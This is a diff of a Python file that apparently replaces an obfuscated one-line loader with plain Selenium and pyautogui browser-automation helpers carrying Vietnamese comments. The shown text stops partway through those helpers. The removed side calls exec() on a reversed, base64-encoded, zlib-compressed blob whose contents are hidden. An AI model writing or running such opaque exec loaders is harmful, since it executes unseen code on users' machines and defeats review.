@@ -1,7 +1,560 @@
-# chaycode
-_ = lambda __: __import__("zlib").decompress(__import__("base64").b64decode(__[::-1]))
-exec(
-    (_)(
-        b"==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"
+# -*- coding: utf-8 -*-
+import time
+import os
+
+# Kiểm tra và cài đặt các thư viện cần thiết nếu chưa có
+try:
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.common.keys import Keys
+    from colorama import Fore, Back, Style, init
+    import pyautogui
+    import random
+    import getpass
+
+except ImportError:
+    os.system("pip install seleniumbase")
+    os.system("pip install selenium")
+    os.system("pip install pyautogui")
+    os.system("pip install colorama")
+    from colorama import Fore, Back, Style, init
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.common.keys import Keys
+    import pyautogui
+    import random
+    import getpass
+
+
+from time import sleep
+
+"""HÀM XỬ LÝ CỨNG"""
+
+
+def ChuyenTab1():
+    driver.switch_to.window(driver.window_handles[0])
+
+
+def ChuyenTab2():
+    driver.switch_to.window(driver.window_handles[1])
+
+
+# Khởi tạo trình duyệt với tùy chọn ẩn hoặc hiện
+def khoi_tao_trinh_duyet(che_do_an=False):
+    chrome_options = Options()
+
+    if che_do_an:
+        # Chế độ headless (ẩn trình duyệt)
+        chrome_options.add_argument("--headless")
+        chrome_options.add_argument("--disable-gpu")
+        chrome_options.add_argument(
+            "--window-size=1920x1080"
+        )  # Đảm bảo kích thước hiển thị đúng
+        # print("Trình duyệt đang chạy ở chế độ ẩn.")
+    else:
+        # print("Trình duyệt đang chạy ở chế độ hiển thị.")
+        pass
+
+    # Khởi tạo trình duyệt Chrome với các tùy chọn đã thiết lập
+    driver = webdriver.Chrome(options=chrome_options)
+    return driver
+
+
+# Ví dụ sử dụng:
+# Khởi tạo trình duyệt ở chế độ ẩn
+# driver = khoi_tao_trinh_duyet(che_do_an=True)
+
+# Khởi tạo trình duyệt ở chế độ hiển thị
+# driver = khoi_tao_trinh_duyet(che_do_an=False)
+
+
+# Upload file
+def upload_file(file_name):
+    # Đợi hộp thoại tải lên mở ra
+    time.sleep(2)
+
+    # Lấy đường dẫn đầy đủ của tệp trong thư mục hiện hành
+    current_directory = os.getcwd()  # Lấy thư mục hiện hành
+    file_path = os.path.join(current_directory, file_name)  # Kết hợp thư mục và tên tệp
+
+    # Nhập đường dẫn tệp vào hộp thoại
+    pyautogui.write(file_path)
+
+    # Nhấn Enter để xác nhận tải file lên
+    pyautogui.press("enter")
+
+
+"""HÀM XỬ LÝ VÙNG CHỌN TỰ ĐỘNG HÓA"""
+
+
+# - - - Nếu phần tử có sẵn có thể click được thì dùng hàm này
+def autoKhiPhanTuCoTheClickDuoc_ID(boXuLy, thoiGianXuLy, idd):
+    return WebDriverWait(boXuLy, thoiGianXuLy).until(
+        EC.element_to_be_clickable((By.ID, idd))
     )
+
+
+def autoKhiPhanTuCoTheClickDuoc_CLASS_NAME(boXuLy, thoiGianXuLy, className):
+    return WebDriverWait(boXuLy, thoiGianXuLy).until(
+        EC.element_to_be_clickable((By.CLASS_NAME, className))
+    )
+
+
+def autoKhiPhanTuCoTheClickDuoc_XPATH(boXuLy, thoiGianXuLy, xPath):
+    return WebDriverWait(boXuLy, thoiGianXuLy).until(
+        EC.element_to_be_clickable((By.XPATH, xPath))
+    )
+
+
+def autoKhiPhanTuCoTheClickDuoc_CSS_SELECTOR(boXuLy, thoiGianXuLy, cssSelector):
+    return WebDriverWait(boXuLy, thoiGianXuLy).until(
+        EC.element_to_be_clickable((By.CSS_SELECTOR, cssSelector))
+    )
+
+
+"""# - - - Nếu đợi phần tử cần hiển thị thì dùng hàm này"""
+
+
+def autoDoiPhanTuHienThi_ID(boXuLy, thoiGianXuLy, idd):
+    return WebDriverWait(boXuLy, thoiGianXuLy).until(
+        EC.visibility_of_element_located((By.ID, idd))
+    )
+
+
+def autoDoiPhanTuHienThi_CLASS_NAME(boXuLy, thoiGianXuLy, className):
+    return WebDriverWait(boXuLy, thoiGianXuLy).until(
+        EC.visibility_of_element_located((By.CLASS_NAME, className))
+    )
+
